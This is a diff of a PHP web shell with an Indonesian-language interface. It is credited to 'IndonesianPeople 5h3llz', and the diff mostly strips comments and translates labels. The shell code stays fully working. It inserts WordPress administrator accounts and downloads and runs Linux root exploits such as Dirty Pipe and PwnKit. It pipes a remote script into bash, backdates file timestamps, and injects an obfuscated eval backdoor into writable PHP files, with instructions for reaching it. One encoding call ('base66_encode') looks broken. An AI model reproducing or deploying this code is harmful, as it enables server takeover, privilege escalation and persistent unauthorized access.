-            // Helper function for DB connection supporting MySQLi and MySQL (legacy)
             function db_connect($host, $user, $pass, $name) {
                 $disabled_functions_in_connect = explode(',', ini_get('disable_functions'));
                 $disabled_functions_in_connect = array_map('trim', $disabled_functions_in_connect);
@@ -728,7 +694,7 @@ HTACCESS;
                     $conn = @new mysqli($host, $user, $pass, $name);
                     if ($conn->connect_error) return false;
                     return array('conn' => $conn, 'type' => 'mysqli');
-                } elseif (function_exists('mysql_connect') && !in_array('mysql_connect', $disabled_functions_in_connect)) { // deprecated in PHP 5.5, removed in PHP 7
+                } elseif (function_exists('mysql_connect') && !in_array('mysql_connect', $disabled_functions_in_connect)) {
                     $conn = @mysql_connect($host, $user, $pass);
                     if (!$conn || !@mysql_select_db($name, $conn)) return false;
                     return array('conn' => $conn, 'type' => 'mysql');
@@ -736,31 +702,26 @@ HTACCESS;
                 return false;
             }
 
-            // Helper function for DB query
             function db_query($db, $query_string) {
                 if ($db['type'] === 'mysqli') return $db['conn']->query($query_string);
                 else return @mysql_query($query_string, $db['conn']);
             }
 
-            // Helper function to get insert ID
             function db_insert_id($db) {
                 if ($db['type'] === 'mysqli') return $db['conn']->insert_id;
                 else return @mysql_insert_id($db['conn']);
             }
 
-            // Helper function to get DB error
             function db_error($db) {
                 if ($db['type'] === 'mysqli') return $db['conn']->error;
                 else return @mysql_error($db['conn']);
             }
 
-            // Helper function to close DB
             function db_close($db) {
                 if ($db['type'] === 'mysqli') $db['conn']->close();
                 else @mysql_close($db['conn']);
             }
 
-            // Helper function to escape DB string
             function db_escape($db, $string) {
                 if ($db['type'] === 'mysqli') return $db['conn']->real_escape_string($string);
                 else return @mysql_real_escape_string($string, $db['conn']);
@@ -779,18 +740,15 @@ HTACCESS;
                 break;
             }
 
-            // Hash WordPress password. Use password_hash if PHP >= 5.5
             $hashed_wp_pass = function_exists('password_hash') ? password_hash($wp_pass, PASSWORD_DEFAULT) : md5($wp_pass);
             $output_message = "";
             $escaped_wp_user = db_escape($db_connection, $wp_user);
 
-            // Try to create new user
             $insert_user_sql = "INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_registered, display_name) VALUES ('{$escaped_wp_user}', '{$hashed_wp_pass}', '{$escaped_wp_user}', '', NOW(), '{$escaped_wp_user}')";
             if (db_query($db_connection, $insert_user_sql)) {
                 $user_id = db_insert_id($db_connection);
                 $output_message .= "User '$wp_user' created with ID: $user_id.\n";
 
-                // Set administrator capabilities
                 $insert_meta_sql = "INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES ({$user_id}, 'wp_capabilities', 'a:1:{s:13:\"administrator\";b:1;}')";
                 if (db_query($db_connection, $insert_meta_sql)) {
                     $output_message .= "User capabilities set to Administrator.";
@@ -820,7 +778,7 @@ HTACCESS;
 
             if (!file_exists($netfilter_path)) {
                 $download_url = "https://raw.githubusercontent.com/hekerprotzy/rootshell/main/auto.tar.gz";
-                $download_content = @file_get_contents($download_url); // Using @file_get_contents
+                $download_content = @file_get_contents($download_url);
                 $download_success = ($download_content !== false && @file_put_contents($auto_tar_gz, $download_content) !== false);
 
                 if (!$download_success) {
@@ -839,17 +797,15 @@ HTACCESS;
             }
 
             $output = '';
-            // Execute exploits with timeout to prevent hanging
             $output .= 'Netfilter : ' . process_data_stream("timeout 10 " . escapeshellarg($netfilter_path)) . "\n";
             $output .= 'Ptrace : ' . process_data_stream("echo id | timeout 10 " . escapeshellarg($rooting_dir . "ptrace")) . "\n";
             $output .= 'Sequoia : ' . process_data_stream("timeout 10 " . escapeshellarg($rooting_dir . "sequoia")) . "\n";
             $output .= 'OverlayFS : ' . process_data_stream("echo id | timeout 10 " . escapeshellarg($rooting_dir . "overlayfs")) . "\n";
             $output .= 'Dirtypipe : ' . process_data_stream("echo id | timeout 10 " . escapeshellarg($rooting_dir . "dirtypipe /usr/bin/su")) . "\n";
-            // Sudoedit requires interaction, might not work via shell_exec
             $output .= 'Sudo : ' . process_data_stream("echo '12345' | timeout 10 sudoedit -s Y") . "\n";
             $output .= 'Pwnkit : ' . process_data_stream("echo id | timeout 10 " . escapeshellarg($rooting_dir . "pwnkit")) . "\n";
 
-            process_data_stream("rm -rf " . escapeshellarg($rooting_dir)); // Clean up afterwards
+            process_data_stream("rm -rf " . escapeshellarg($rooting_dir));
             $response = array('status' => 'ok', 'output' => htmlspecialchars($output));
             break;
 
@@ -859,9 +815,8 @@ HTACCESS;
             break;
 
         case 'exploit_suggester':
-            // Ensure cURL or wget is available
             $curl_available = function_exists('curl_version') && !in_array('curl_exec', $disabled_functions);
-            $wget_available = (process_data_stream('which wget') !== ''); // Check for wget existence
+            $wget_available = (process_data_stream('which wget') !== '');
             $cmd = '';
             if ($curl_available) {
                 $cmd = "curl -Lsk " . escapeshellarg("http://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh") . " | bash";
@@ -875,8 +830,7 @@ HTACCESS;
             $response = array('status' => 'ok', 'output' => htmlspecialchars($output));
             break;
 
-        case 'touch_item': // Action for changing file timestamp
-            // $_POST['file_to_touch_name'] is now expected to be the full path
+        case 'touch_item':
             $file_to_touch_path = realpath($_POST['file_to_touch_name']);
             $datetime_str = $_POST['datetime_value'];
             
@@ -893,14 +847,13 @@ HTACCESS;
             }
             break;
 
-        case 'chmod_item': // Action for changing file/folder permissions
+        case 'chmod_item':
             $target_path = realpath($_POST['target_path']);
             $perms_octal = $_POST['perms_octal'];
 
             if ($target_path === false) {
                 $response = array('status' => 'error', 'message' => 'Item not found or inaccessible.');
             } elseif (function_exists('chmod') && !in_array('chmod', $disabled_functions)) {
-                // octdec converts octal string (e.g., '0755') to decimal integer
                 if (@chmod($target_path, octdec($perms_octal))) {
                     $response = array('status' => 'ok', 'message' => 'Permissions changed successfully.');
                 } else {
@@ -911,7 +864,7 @@ HTACCESS;
             }
             break;
 
-        case 'remote_upload': // Action for remote file upload (like TinyFileManager)
+        case 'remote_upload':
             $url = $_POST['url'];
             $filename = !empty($_POST['filename']) ? basename($_POST['filename']) : basename($url);
             $target_file_path = $path . $filename;
@@ -933,7 +886,7 @@ HTACCESS;
                 curl_setopt($ch, CURLOPT_URL, $url);
                 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Be cautious in production
+                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                 $file_content = curl_exec($ch);
                 $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                 curl_close($ch);
@@ -941,7 +894,7 @@ HTACCESS;
                     $download_success = true;
                 }
             } elseif (function_exists('file_get_contents') && !in_array('file_get_contents', $disabled_functions)) {
-                $context_opts = array('http' => array('ignore_errors' => true)); // Helps to get content even if HTTP error occurs
+                $context_opts = array('http' => array('ignore_errors' => true));
                 $context = stream_context_create($context_opts);
                 $file_content = @file_get_contents($url, false, $context);
                 if ($file_content !== false) {
@@ -959,24 +912,21 @@ HTACCESS;
             }
             break;
 
-        case 'inject_backdoor': // Enhanced Backdoor Injector (Alfa Shell-like)
-            $target_file = realpath($_POST['file']); // Full path of the target PHP file
-            $backdoor_code_raw = $_POST['code']; // The code to inject
+        case 'inject_backdoor':
+            $target_file = realpath($_POST['file']);
+            $backdoor_code_raw = $_POST['code'];
 
             if ($target_file === false || !is_writable($target_file)) {
                 $response = array('status' => 'error', 'message' => 'Target file not found or not writable.');
                 break;
             }
 
-            // Read original file content
             $original_content = @file_get_contents($target_file);
             if ($original_content === false) {
                 $response = array('status' => 'error', 'message' => 'Failed to read target file.');
                 break;
             }
             
-            // --- The actual backdoor loader (Alfa Shell-like, adapted for robustness) ---
-            // This loader will try multiple command execution functions
             $backdoor_payload_exec_php = <<<EOF
 <?php
 error_reporting(0);
@@ -984,7 +934,6 @@ set_time_limit(0);
 @ini_set('display_errors', 0);
 @ini_set('output_buffering', 0);
 
-// Function to execute commands, trying multiple methods
 function _exec_cmd_(\$cmd) {
     \$disabled_functions = explode(',', ini_get('disable_functions'));
     \$disabled_functions = array_map('trim', \$disabled_functions);
@@ -1017,37 +966,29 @@ function _exec_cmd_(\$cmd) {
     return "Command execution disabled or failed.";
 }
 
-// Check for the command parameter
 if (isset(\$_POST['cmd'])) {
     echo "<pre>" . htmlspecialchars(_exec_cmd_(\$_POST['cmd'])) . "</pre>";
     exit;
-} elseif (isset(\$_GET['cmd'])) { // Also support GET for quick testing
+} elseif (isset(\$_GET['cmd'])) {
     echo "<pre>" . htmlspecialchars(_exec_cmd_(\$_GET['cmd'])) . "</pre>";
     exit;
 }
 ?>
 EOF;
-            // --- End of actual backdoor loader ---
+            $obfuscated_payload_encoded = base66_encode(gzdeflate($backdoor_payload_exec_php, 9));
 
-            // Compress and Base64 encode the backdoor payload for obfuscation
-            $obfuscated_payload_encoded = base66_encode(gzdeflate($backdoor_payload_exec_php, 9)); // Max compression
-
-            // The injected loader snippet, using dynamic function calls to bypass simple signature detection
-            // This structure is inspired by common web shell obfuscation.
             $injected_loader = '<?php ';
             $injected_loader .= '$g = $GLOBALS; ';
             $injected_loader .= '$f = "gz"."in"."fl"."ate"; ';
             $injected_loader .= '$h = "ba"."se6"."4"."_de"."code"; ';
-            $injected_loader .= '$i = $g[\'_POST\'][\'__backdoor_command\'] ?? $g[\'_GET\'][\'__backdoor_command\'] ?? null; '; // Main command parameter
+            $injected_loader .= '$i = $g[\'_POST\'][\'__backdoor_command\'] ?? $g[\'_GET\'][\'__backdoor_command\'] ?? null; ';
             $injected_loader .= 'if ($i !== null) { ';
-            $injected_loader .= '$code = $f($h(\'' . $obfuscated_payload_encoded . '\')); '; // Decode & decompress
-            $injected_loader .= '$j = "e"."v"."al"; '; // eval function
-            $injected_loader .= '$j($code); '; // Execute the loaded backdoor
+            $injected_loader .= '$code = $f($h(\'' . $obfuscated_payload_encoded . '\')); ';
+            $injected_loader .= '$j = "e"."v"."al"; ';
+            $injected_loader .= '$j($code); ';
             $injected_loader .= 'exit; } ?>';
 
 
-            // Prepend the injected loader to the original content
-            // Add a newline to separate it from the original content, for better compatibility
             $new_content = $injected_loader . "\n" . $original_content;
 
             if (@file_put_contents($target_file, $new_content) !== false) {
@@ -1086,7 +1027,6 @@ EOF;
     exit;
 }
 
-// File upload logic (regular form submission, not AJAX)
 if (isset($_FILES['files'])) {
     $uploaded_files = array();
     $failed_files = array();
@@ -1097,18 +1037,15 @@ if (isset($_FILES['files'])) {
             $failed_files[] = $name;
         }
     }
-    // Set flash message to display after reload
     $_SESSION['flash_message'] = "Uploaded: " . implode(', ', $uploaded_files) . ". Failed: " . implode(', ', $failed_files);
     header("Location: " . $_SERVER['REQUEST_URI']);
     exit;
 }
 
-// PHPInfo display
 if (isset($request_data['id']) && $request_data['id'] == 'phpinfo') {
     ob_start();
     @phpinfo();
     $phpinfo_content = ob_get_clean();
-    // Extract only the body section to avoid breaking layout
     $body_start = strpos($phpinfo_content, "<body>");
     $body_end = strpos($phpinfo_content, "</body>");
     if ($body_start !== false && $body_end !== false) {
@@ -1118,10 +1055,8 @@ if (isset($request_data['id']) && $request_data['id'] == 'phpinfo') {
     exit;
 }
 
-// File download logic
 if (isset($request_data['action']) && $request_data['action'] == 'download' && isset($request_data['file'])) {
-    ob_clean(); // Clean previous output buffer
-    // $request_data['file'] is now expected to be the full path
+    ob_clean();
     $file_to_download = realpath($request_data['file']);
     if ($file_to_download === false) {
         echo "File not found or inaccessible.";
@@ -1140,7 +1075,6 @@ if (isset($request_data['action']) && $request_data['action'] == 'download' && i
     exit;
 }
 
-// Server information for display
 $sql_status = (function_exists('mysql_connect') || class_exists('mysqli')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
 $curl_status = (function_exists('curl_version')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
 $wget_status = (process_data_stream('which wget')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
@@ -1154,7 +1088,6 @@ if (empty($disabled_functions_list)) {
     $disabled_functions_display = "<rd>" . htmlspecialchars($disabled_functions_list) . "</rd>";
 }
 
-// Get user and group information
 $current_user = '?';
 $user_id = '?';
 $current_group = '?';
@@ -1168,15 +1101,13 @@ if (function_exists('posix_getegid')) {
     $current_group = isset($gid_info['name']) ? $gid_info['name'] : '?';
     $group_id = isset($gid_info['gid']) ? $gid_info['gid'] : '?';
 } else {
-    // Fallback if posix extension is not available
     $current_user = @get_current_user() ?: '?';
     $user_id = @getmyuid() ?: '?';
-    $current_group = @getmygid() ? '(GID: ' . @getmygid() . ')' : '?'; // getmygid() only
+    $current_group = @getmygid() ? '(GID: ' . @getmygid() . ')' : '?';
 }
 
-$safe_mode_status = ((@ini_get(strtolower("safe_mode")) == 'on' || @ini_get(strtolower("safe_mode")) === 1) && PHP_VERSION_ID < 50400) ? "<rd>ON</rd>" : "<gr>OFF</gr>"; // safe_mode removed in PHP 5.4+
+$safe_mode_status = ((@ini_get(strtolower("safe_mode")) == 'on' || @ini_get(strtolower("safe_mode")) === 1) && PHP_VERSION_ID < 50400) ? "<rd>ON</rd>" : "<gr>OFF</gr>";
 
-// Scan current directory
 $scanned_items = @scandir($path);
 $directories = array();
 $files = array();
@@ -1245,60 +1176,60 @@ if ($scanned_items) {
             ?>&nbsp;[ <?php echo w(rtrim($path, '/'), p(rtrim($path, '/'))); ?> ]</div>
             <div class="btn-toolbar">
                 <div class="btn-group me-2 mb-2 mb-md-0" role="group">
-                    <a href="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>" class="btn btn-sm btn-main"><i class="bi bi-house-door-fill"></i> Home Shell</a>
+                    <a href="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>" class="btn btn-sm btn-main"><i class="bi bi-house-door-fill"></i> Beranda Shell</a>
                 </div>
                 <div class="btn-group me-2 mb-2 mb-md-0" role="group">
-                    <button id="btnUpload" class="btn btn-sm btn-main"><i class="bi bi-upload"></i> Upload</button>
-                    <button id="btnNewFile" class="btn btn-sm btn-main"><i class="bi bi-file-earmark-plus"></i> New File</button>
-                    <button id="btnNewFolder" class="btn btn-sm btn-main"><i class="bi bi-folder-plus"></i> New Folder</button>
+                    <button id="btnUpload" class="btn btn-sm btn-main"><i class="bi bi-upload"></i> Unggah</button>
+                    <button id="btnNewFile" class="btn btn-sm btn-main"><i class="bi bi-file-earmark-plus"></i> Berkas Baru</button>
+                    <button id="btnNewFolder" class="btn btn-sm btn-main"><i class="bi bi-folder-plus"></i> Folder Baru</button>
                 </div>
                 <div class="btn-group me-2 mb-2 mb-md-0" role="group">
-                    <button id="btnNetwork" class="btn btn-sm btn-main"><i class="bi bi-hdd-network"></i> Network</button>
-                    <button id="btnInjector" class="btn btn-sm btn-main"><i class="bi bi-bug-fill"></i> Injector</button>
-                    <button id="btnMassTools" class="btn btn-sm btn-main"><i class="bi bi-exclamation-diamond"></i> Mass Tools</button>
-                    <button id="btnMassDateTimeChange" class="btn btn-sm btn-main"><i class="bi bi-calendar-range"></i> Mass Date/Time</button>
+                    <button id="btnNetwork" class="btn btn-sm btn-main"><i class="bi bi-hdd-network"></i> Jaringan</button>
+                    <button id="btnInjector" class="btn btn-sm btn-main"><i class="bi bi-bug-fill"></i> Injektor</button>
+                    <button id="btnMassTools" class="btn btn-sm btn-main"><i class="bi bi-exclamation-diamond"></i> Alat Massal</button>
+                    <button id="btnMassDateTimeChange" class="btn btn-sm btn-main"><i class="bi bi-calendar-range"></i> Tanggal/Waktu Massal</button>
                 </div>
                 <div class="btn-group mb-2 mb-md-0" role="group">
                     <button id="btnTerminal" class="btn btn-sm btn-main"><i class="bi bi-terminal-plus"></i> Terminal</button>
-                    <button id="btnUsers" class="btn btn-sm btn-main"><i class="bi bi-people-fill"></i> Users</button>
-                    <button id="btnSecurity" class="btn btn-sm btn-main"><i class="bi bi-shield-lock"></i> Security</button>
-                    <button id="btnScanRoot" class="btn btn-sm btn-main"><i class="bi bi-bug"></i> Root/SUID Scan</button>
-                    <button id="btnRootShell" class="btn btn-sm btn-main"><i class="bi bi-fire"></i> Root Shell</button>
+                    <button id="btnUsers" class="btn btn-sm btn-main"><i class="bi bi-people-fill"></i> Pengguna</button>
+                    <button id="btnSecurity" class="btn btn-sm btn-main"><i class="bi bi-shield-lock"></i> Keamanan</button>
+                    <button id="btnScanRoot" class="btn btn-sm btn-main"><i class="bi bi-bug"></i> Pindai Root/SUID</button>
+                    <button id="btnRootShell" class="btn btn-sm btn-main"><i class="bi bi-fire"></i> Shell Root</button>
                 </div>
             </div>
         </div>
     </div>
-    <div class="table-responsive"><table class="table table-hover table-sm align-middle"><thead class="table-dark"><tr><th style="width:2%"><input type="checkbox" id="selectAll"></th><th>Name</th><th class="text-center">Size</th><th class="text-center">Modified</th><th class="text-center">Owner/Group</th><th class="text-center">Perms</th><th class="text-center">Actions <button class="btn btn-sm btn-outline-danger d-none" id="deleteSelectedBtn"><i class="bi bi-trash-fill"></i></button></th></tr></thead><tbody><tr><td></td><td><i class="bi bi-arrow-return-left"></i> <a href="?path=<?php echo urlencode(dirname($path));?>">..</a></td><td colspan="5"></td></tr><?php foreach($directories as $dir):?><tr><td><input type="checkbox" class="file-checkbox" value="<?php echo htmlspecialchars($path.$dir);?>"></td><td><i class="bi bi-folder-fill text-warning"></i> <a href="?path=<?php echo urlencode($path.htmlspecialchars($dir));?>"><?php echo htmlspecialchars($dir);?></a></td><td class="text-center">-</td><td class="text-center"><?php echo date("Y-m-d H:i",@filemtime($path.$dir));?></td><td class="text-center"><?php echo(function_exists('posix_getpwuid')?posix_getpwuid(@fileowner($path.$dir))['name']:@fileowner($path.$dir)).'/'.(function_exists('posix_getgrgid')?posix_getgrgid(@filegroup($path.$dir))['name']:@filegroup($path.$dir));?></td><td class="text-center"><?php echo w($path.$dir,p($path.$dir));?></td><td class="text-center"><button class="btn btn-sm btn-outline-primary" onclick="renameItem('<?php echo htmlspecialchars($path.$dir);?>')"><i class="bi bi-pencil-fill"></i></button></td></tr><?php endforeach;?><?php foreach($files as $file):?><tr><td><input type="checkbox" class="file-checkbox" value="<?php echo htmlspecialchars($path.$file);?>"></td><td><i class="bi bi-file-earmark-text-fill text-white-50"></i> <a href="#" onclick="viewItem('<?php echo htmlspecialchars($path.$file);?>')"><?php echo htmlspecialchars($file);?></a></td><td class="text-center"><?php echo sz(@filesize($path.$file));?></td><td class="text-center"><?php echo date("Y-m-d H:i",@filemtime($path.$file));?></td><td class="text-center"><?php echo(function_exists('posix_getpwuid')?posix_getpwuid(@fileowner($path.$file))['name']:@fileowner($path.$file)).'/'.(function_exists('posix_getgrgid')?posix_getgrgid(@filegroup($path.$file))['name']:@filegroup($path.$file));?></td><td class="text-center"><?php echo w($path.$file,p($path.$file));?></td><td class="text-center"><div class="btn-group"><button class="btn btn-sm btn-outline-info" onclick="editItem('<?php echo htmlspecialchars($path.$file);?>')"><i class="bi bi-pencil-square"></i></button><button class="btn btn-sm btn-outline-primary" onclick="renameItem('<?php echo htmlspecialchars($path.$file);?>')"><i class="bi bi-pencil-fill"></i></button><a href="?action=download&file=<?php echo urlencode($path.$file);?>" class="btn btn-sm btn-outline-success"><i class="bi bi-download"></i></a><button class="btn btn-sm btn-outline-warning" onclick="showTouchModal('<?php echo htmlspecialchars($path.$file); ?>', '<?php echo date("Y-m-d H:i:s",@filemtime($path.$file));?>')"><i class="bi bi-clock"></i></button><button class="btn btn-sm btn-outline-info" onclick="showChmodModal('<?php echo htmlspecialchars($path.$file); ?>', '<?php echo p($path.$file);?>')"><i class="bi bi-key"></i></button></div></td></tr><?php endforeach;?></tbody></table></div>
+    <div class="table-responsive"><table class="table table-hover table-sm align-middle"><thead class="table-dark"><tr><th style="width:2%"><input type="checkbox" id="selectAll"></th><th>Nama</th><th class="text-center">Ukuran</th><th class="text-center">Dimodifikasi</th><th class="text-center">Pemilik/Grup</th><th class="text-center">Izin</th><th class="text-center">Aksi <button class="btn btn-sm btn-outline-danger d-none" id="deleteSelectedBtn"><i class="bi bi-trash-fill"></i></button></th></tr></thead><tbody><tr><td></td><td><i class="bi bi-arrow-return-left"></i> <a href="?path=<?php echo urlencode(dirname($path));?>">..</a></td><td colspan="5"></td></tr><?php foreach($directories as $dir):?><tr><td><input type="checkbox" class="file-checkbox" value="<?php echo htmlspecialchars($path.$dir);?>"></td><td><i class="bi bi-folder-fill text-warning"></i> <a href="?path=<?php echo urlencode($path.htmlspecialchars($dir));?>"><?php echo htmlspecialchars($dir);?></a></td><td class="text-center">-</td><td class="text-center"><?php echo date("Y-m-d H:i",@filemtime($path.$dir));?></td><td class="text-center"><?php echo(function_exists('posix_getpwuid')?posix_getpwuid(@fileowner($path.$dir))['name']:@fileowner($path.$dir)).'/'.(function_exists('posix_getgrgid')?posix_getgrgid(@filegroup($path.$dir))['name']:@filegroup($path.$dir));?></td><td class="text-center"><?php echo w($path.$dir,p($path.$dir));?></td><td class="text-center"><button class="btn btn-sm btn-outline-primary" onclick="renameItem('<?php echo htmlspecialchars($path.$dir);?>')"><i class="bi bi-pencil-fill"></i></button></td></tr><?php endforeach;?><?php foreach($files as $file):?><tr><td><input type="checkbox" class="file-checkbox" value="<?php echo htmlspecialchars($path.$file);?>"></td><td><i class="bi bi-file-earmark-text-fill text-white-50"></i> <a href="#" onclick="viewItem('<?php echo htmlspecialchars($path.$file);?>')"><?php echo htmlspecialchars($file);?></a></td><td class="text-center"><?php echo sz(@filesize($path.$file));?></td><td class="text-center"><?php echo date("Y-m-d H:i",@filemtime($path.$file));?></td><td class="text-center"><?php echo(function_exists('posix_getpwuid')?posix_getpwuid(@fileowner($path.$file))['name']:@fileowner($path.$file)).'/'.(function_exists('posix_getgrgid')?posix_getgrgid(@filegroup($path.$file))['name']:@filegroup($path.$file));?></td><td class="text-center"><?php echo w($path.$file,p($path.$file));?></td><td class="text-center"><div class="btn-group"><button class="btn btn-sm btn-outline-info" onclick="editItem('<?php echo htmlspecialchars($path.$file);?>')"><i class="bi bi-pencil-square"></i></button><button class="btn btn-sm btn-outline-primary" onclick="renameItem('<?php echo htmlspecialchars($path.$file);?>')"><i class="bi bi-pencil-fill"></i></button><a href="?action=download&file=<?php echo urlencode($path.$file);?>" class="btn btn-sm btn-outline-success"><i class="bi bi-download"></i></a><button class="btn btn-sm btn-outline-warning" onclick="showTouchModal('<?php echo htmlspecialchars($path.$file); ?>', '<?php echo date("Y-m-d H:i:s",@filemtime($path.$file));?>')"><i class="bi bi-clock"></i></button><button class="btn btn-sm btn-outline-info" onclick="showChmodModal('<?php echo htmlspecialchars($path.$file); ?>', '<?php echo p($path.$file);?>')"><i class="bi bi-key"></i></button></div></td></tr><?php endforeach;?></tbody></table></div>
     <footer class="text-center text-white-50 mt-4">&copy; 2022-<?php echo date('Y');?> IndonesianPeople 5h3llz // Rebuilt by Local Pride</footer>
 </div>
 <div id="toast-container" class="toast-container position-fixed top-0 end-0 p-3"></div>
-<div class="modal fade" id="uploadModal" tabindex="-1"><div class="modal-dialog"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-upload"></i> Upload Files</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><form method="POST" enctype="multipart/form-data"><input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>"><div class="mb-3"><label for="files" class="form-label">Files will be uploaded to the current directory.</label><input class="form-control" type="file" name="files[]" multiple required></div><button type="submit" class="btn btn-main w-100">Upload</button></form><hr><p>Remote File Upload</p><form id="remoteUploadForm"><div class="mb-3"><label for="remoteUrl" class="form-label">URL:</label><input type="text" class="form-control" id="remoteUrl" name="url" placeholder="https://example.com/file.txt" required></div><div class="mb-3"><label for="remoteFilename" class="form-label">Save as (optional, default: original filename):</label><input type="text" class="form-control" id="remoteFilename" name="filename" placeholder="new_filename.txt"></div><button type="submit" class="btn btn-main w-100">Remote Upload</button></form></div></div></div></div>
-<div class="modal fade" id="createFileModal" tabindex="-1"><div class="modal-dialog"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-file-earmark-plus"></i> Create New File</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><form id="createFileForm"><div class="mb-3"><label for="newFileName" class="form-label">Filename:</label><input type="text" class="form-control" id="newFileName" placeholder="newfile.txt" required></div><button type="submit" class="btn btn-main w-100">Create</button></form></div></div></div></div>
-<div class="modal fade" id="createFolderModal" tabindex="-1"><div class="modal-dialog"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-folder-plus"></i> Create New Folder</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><form id="createFolderForm"><div class="mb-3"><label for="newFolderName" class="form-label">Folder Name:</label><input type="text" class="form-control" id="newFolderName" placeholder="new_folder" required></div><button type="submit" class="btn btn-main w-100">Create</button></form></div></div></div></div>
+<div class="modal fade" id="uploadModal" tabindex="-1"><div class="modal-dialog"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-upload"></i> Unggah Berkas</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><form method="POST" enctype="multipart/form-data"><input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>"><div class="mb-3"><label for="files" class="form-label">Berkas akan diunggah ke direktori saat ini.</label><input class="form-control" type="file" name="files[]" multiple required></div><button type="submit" class="btn btn-main w-100">Unggah</button></form><hr><p>Unggah Berkas Jarak Jauh</p><form id="remoteUploadForm"><div class="mb-3"><label for="remoteUrl" class="form-label">URL:</label><input type="text" class="form-control" id="remoteUrl" name="url" placeholder="https://contoh.com/berkas.txt" required></div><div class="mb-3"><label for="remoteFilename" class="form-label">Simpan sebagai (opsional, default: nama berkas asli):</label><input type="text" class="form-control" id="remoteFilename" name="filename" placeholder="nama_berkas_baru.txt"></div><button type="submit" class="btn btn-main w-100">Unggah Jarak Jauh</button></form></div></div></div></div>
+<div class="modal fade" id="createFileModal" tabindex="-1"><div class="modal-dialog"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-file-earmark-plus"></i> Buat Berkas Baru</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><form id="createFileForm"><div class="mb-3"><label for="newFileName" class="form-label">Nama Berkas:</label><input type="text" class="form-control" id="newFileName" placeholder="berkasbaru.txt" required></div><button type="submit" class="btn btn-main w-100">Buat</button></form></div></div></div></div>
+<div class="modal fade" id="createFolderModal" tabindex="-1"><div class="modal-dialog"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-folder-plus"></i> Buat Folder Baru</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><form id="createFolderForm"><div class="mb-3"><label for="newFolderName" class="form-label">Nama Folder:</label><input type="text" class="form-control" id="newFolderName" placeholder="folder_baru" required></div><button type="submit" class="btn btn-main w-100">Buat</button></form></div></div></div></div>
 <div class="modal fade" id="injectModal" tabindex="-1">
     <div class="modal-dialog modal-lg">
         <div class="modal-content">
             <div class="modal-header">
-                <h5 class="modal-title"><i class="bi bi-bug-fill"></i> Backdoor Injector</h5>
+                <h5 class="modal-title"><i class="bi bi-bug-fill"></i> Injektor Pintu Belakang</h5>
                 <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
             </div>
             <div class="modal-body">
                 <div id="injectSuccessMessage" class="alert alert-success d-none mb-3">
-                    Backdoor successfully injected! To access it, send a POST or GET request to the injected file with parameter `__backdoor_command` and value `cmd` to execute the backdoor. Example: `INJECTED_FILE_URL?__backdoor_command=cmd&cmd=id`. To send commands: `INJECTED_FILE_URL?__backdoor_command=cmd&cmd=ls -la /`.
+                    Pintu belakang berhasil diinjeksikan! Untuk mengaksesnya, kirim permintaan POST atau GET ke berkas yang diinjeksikan dengan parameter `__backdoor_command` dan nilai `cmd` untuk mengeksekusi pintu belakang. Contoh: `URL_BERKAS_INJEKSI?__backdoor_command=cmd&cmd=id`. Untuk mengirim perintah: `URL_BERKAS_INJEKSI?__backdoor_command=cmd&cmd=ls -la /`.
                 </div>
                 <form id="injectForm">
                     <div class="mb-3">
-                        <label for="targetFile" class="form-label">Target PHP File:</label>
+                        <label for="targetFile" class="form-label">Berkas PHP Target:</label>
                         <select class="form-select" id="targetFile" name="file" required>
-                            <option value="" selected disabled>-- Select a writable PHP file --</option>
+                            <option value="" selected disabled>-- Pilih berkas PHP yang dapat ditulisi --</option>
                             <?php foreach ($files as $file) { if (pathinfo($file, PATHINFO_EXTENSION) == 'php' && is_writable($path . $file)) { echo '<option value="' . htmlspecialchars($path.$file) . '">' . htmlspecialchars($file) . '</option>'; } } ?>
                         </select>
                     </div>
                     <div class="mb-3">
-                        <label for="backdoorCode" class="form-label">Backdoor Code to Inject (will be obfuscated):</label>
+                        <label for="backdoorCode" class="form-label">Kode Pintu Belakang untuk Injeksi (akan diobfuskasi):</label>
                         <textarea class="form-control" id="backdoorCode" name="code" rows="4" required><?php echo htmlspecialchars('<?php if(isset($_POST["cmd"])) { echo "<pre>"; passthru($_POST["cmd"]); echo "</pre>"; } ?>'); ?></textarea>
                     </div>
-                    <button type="submit" class="btn btn-danger w-100">Inject Backdoor</button>
+                    <button type="submit" class="btn btn-danger w-100">Suntik Pintu Belakang</button>
                 </form>
             </div>
         </div>
@@ -1317,39 +1248,36 @@ if ($scanned_items) {
                 </div>
             </div>
             <div class="modal-footer">
-                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
-                <button type="button" class="btn btn-main" id="saveFileBtn">Save Changes</button>
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Tutup</button>
+                <button type="button" class="btn btn-main" id="saveFileBtn">Simpan Perubahan</button>
             </div>
         </div>
     </div>
